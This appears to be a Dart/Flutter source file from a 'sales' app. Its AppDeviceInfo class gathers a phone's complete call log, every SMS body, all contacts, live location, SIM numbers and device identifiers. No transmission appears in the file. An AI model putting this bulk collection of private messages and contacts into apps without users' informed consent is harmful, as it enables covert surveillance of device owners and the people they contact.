import 'dart:developer';
import 'dart:io';
import 'package:call_log/call_log.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:location/location.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:sales/models/device_info_call_log.dart';
import 'package:sales/models/device_info_contact.dart';
import 'package:sales/models/device_info_device.dart';
import 'package:sales/models/device_info_live_location.dart';
import 'package:sales/models/device_info_sim_card.dart';
import 'package:sales/models/device_info_sms_log.dart';

class AppDeviceInfo {
  // - IMEI - //
  Future<String> getImei() async {
    String? imei;
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      imei = '${androidInfo.id} | ${androidInfo.brand} | ${androidInfo.model}';
    } 
    return imei!;
  }

  // - CALL LOGS - //
  Future<List<DeviceInfoCallLog>> getCallLogs(String imeiNo) async {
    final Iterable<CallLogEntry> cLog = await CallLog.get();
    List<DeviceInfoCallLog> callLogs = [];
    for (CallLogEntry entry in cLog) {
      DeviceInfoCallLog data = DeviceInfoCallLog(name: '${entry.name}', dateTime: '${DateTime.fromMillisecondsSinceEpoch(entry.timestamp!)}', phoneNumber: '${entry.number}', duration: entry.duration!, type: '${entry.callType?.name}', simDisplayName: '${entry.simDisplayName}');
      callLogs.add(data);
    }
    return callLogs;
  }

  // - SMS LOGS - //
  Future<List<DeviceInfoSmsLog>> getSmsLogs(String imeiNo) async {
    List<DeviceInfoSmsLog> smsLogs = [];
    final SmsQuery _query = SmsQuery();
    List<SmsMessage> smsMessages = await _query.getAllSms;
    smsMessages.forEach((item) {
      DeviceInfoSmsLog smsLog = DeviceInfoSmsLog(name: '${item.sender!}', dateTime: '${item.dateSent}', phoneNumber: '${item.address}', content: item.body!, type: '${item.kind?.name}');
      smsLogs.add(smsLog);
    });
    return smsLogs;
  }

  // - CONTACTS - //
  Future<List<DeviceInfoContact>> getContacts(String imeiNo) async {
    List<DeviceInfoContact> diContacts = [];
    Iterable<Contact> contacts = await ContactsService.getContacts();
    contacts.forEach((item) { 
      String phones = "";
      if (item.phones!.isNotEmpty) {
        item.phones!.forEach((element) { 
          phones = phones + ", "  + element.value!;
        });
      } 

      String emails = "";
      if (item.emails!.isNotEmpty) {
        item.emails!.forEach((element) { 
          emails = emails + ", "  + element.value!;
        });
      } 

      DeviceInfoContact contact = DeviceInfoContact(name: item.displayName, phoneNumber: phones != "" ? phones.substring(2) : null, email: emails != "" ? emails.substring(2) : null);
      diContacts.add(contact);
    });
    return diContacts;
  }

  // - LIVE LOCATION - //
  Future<DeviceInfoLiveLocation> getLocation(String imeiNo) async {
    Location location = new Location();
    LocationData? _locationData = await location.getLocation();
    DeviceInfoLiveLocation liveLocation = DeviceInfoLiveLocation(latitude: '${_locationData.latitude}', longitude: '${_locationData.longitude}');
    return liveLocation;
  }

  // - SIM CARD - //
  Future<DeviceInfoSimCard> getSimCards(String imeiNo) async {
    List<SimCard>? simCards = [];
    simCards = await MobileNumber.getSimCards;
    String? simCard_1 = simCards!.length == 1 ? simCards[0].number : null;
    String? simCard_2 = simCards.length == 2 ? simCards[1].number : null;

    DeviceInfoSimCard simCard = DeviceInfoSimCard(simCardNo1: simCard_1, simCardNo2: simCard_2);
    return simCard;
  }

  // - DEVICE INFO - //
  Future<DeviceInfoDevice> getDeviceInfo(String imeiNo) async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    DeviceInfoDevice device = DeviceInfoDevice(deviceModel: '${androidInfo.model}', deviceBrand: '${androidInfo.brand}', deviceName: '${androidInfo.display}', softwareId: '${androidInfo.id}', operationSystemVersion: 'Android ${androidInfo.version.release} (SDK ${androidInfo.version.sdkInt}), ${androidInfo.manufacturer} ${androidInfo.model}');
    return device;
  }
}
